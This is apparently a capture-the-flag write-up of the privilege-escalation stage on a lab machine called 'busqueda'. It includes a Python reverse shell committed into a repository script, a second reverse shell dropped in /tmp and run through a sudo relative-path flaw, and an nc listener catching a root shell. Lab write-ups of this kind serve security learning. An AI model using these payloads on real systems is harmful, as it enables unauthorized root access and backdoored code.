[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Cloning into 'scripts'...
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:3000  ...  OK
Username for 'http://127.0.0.1:3000': administrator
Password for 'http://administrator@127.0.0.1:3000':
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 0
[proxychains] DLL init: proxychains-ng 4.16
Receiving objects: 100% (6/6), done.
[proxychains] DLL init: proxychains-ng 4.16

cd scripts

ls -la
total 28
drwxr-xr-x   3 blnkn blnkn 4096 May  1 16:15 .
drwxr-xr-x 124 blnkn blnkn 4096 May  1 16:16 ..
-rwxr-xr-x   1 blnkn blnkn  586 May  1 16:15 check-ports.py
-rwxr-xr-x   1 blnkn blnkn  857 May  1 16:15 full-checkup.sh
drwxr-xr-x   8 blnkn blnkn 4096 May  1 16:15 .git
-rwxr-xr-x   1 blnkn blnkn 3346 May  1 16:15 install-flask.sh
-rwxr-xr-x   1 blnkn blnkn 1903 May  1 16:15 system-checkup.py
```
```bash
git log --oneline
b9a29dc (HEAD -> main, origin/main, origin/HEAD) Initial commit

git branch -al
* main
  remotes/origin/HEAD -> origin/main
  remotes/origin/main
```

Making a quick commit
```bash
git add -u

git commit -m "Make it pwnable"
[main 530309c] Make it pwnable
 1 file changed, 12 insertions(+), 1 deletion(-)

git diff origin/main
diff --git a/system-checkup.py b/system-checkup.py
index 5e20399..01cf441 100755
--- a/system-checkup.py
+++ b/system-checkup.py
@@ -1,8 +1,10 @@
 #!/bin/bash
 import subprocess
 import sys
+import socket
+import os

-actions = ['full-checkup', 'docker-ps','docker-inspect']
+actions = ['full-checkup', 'docker-ps', 'docker-inspect', 'pwn-me']

 def run_command(arg_list):
     r = subprocess.run(arg_list, capture_output=True)
@@ -15,6 +17,15 @@ def run_command(arg_list):


 def process_action(action):
+
+    if action == 'pwn-me':
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(("10.10.14.39",4000))
+        os.dup2(s.fileno(),0)
+        os.dup2(s.fileno(),1)
+        os.dup2(s.fileno(),2)
+        pty.spawn("sh")
+
     if action == 'docker-inspect':
         try:
             _format = sys.argv[2]
```

```bash
proxychains -q git push --force
Username for 'http://127.0.0.1:3000': administrator
Password for 'http://administrator@127.0.0.1:3000':
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 4 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 473 bytes | 473.00 KiB/s, done.
Total 3 (delta 2), reused 1 (delta 0), pack-reused 0
error: remote unpack failed: unable to create temporary object directory
To http://127.0.0.1:3000/administrator/scripts.git
 ! [remote rejected] main -> main (unpacker error)
error: failed to push some refs to 'http://127.0.0.1:3000/administrator/scripts.git'
```

😥 back to the drawing board
```bash
git reset --hard origin/main
HEAD is now at b9a29dc Initial commit
```

Looking at the full-checkup thing, the issue is quite obvious
```python
    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
```

All that's left to do is to drop a reverse shell  
And run the sudo line from the current directory
```bash
svc@busqueda:~$ vim /tmp/pwn.py
svc@busqueda:~$ chmod +x /tmp/pwn.py
svc@busqueda:~$ cat /tmp/pwn.py
#!/usr/bin/python3
import socket
import subprocess
import os
import pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.207",4000))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("sh")
```

It took me way to long to figure this one out
```bash
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

But we finally got there
```bash
rlwrap nc -lvnp 4000
listening on [any] 4000 ...
connect to [10.10.14.207] from (UNKNOWN) [10.10.11.208] 38290
# id
id
uid=0(root) gid=0(root) groups=0(root)
#
```
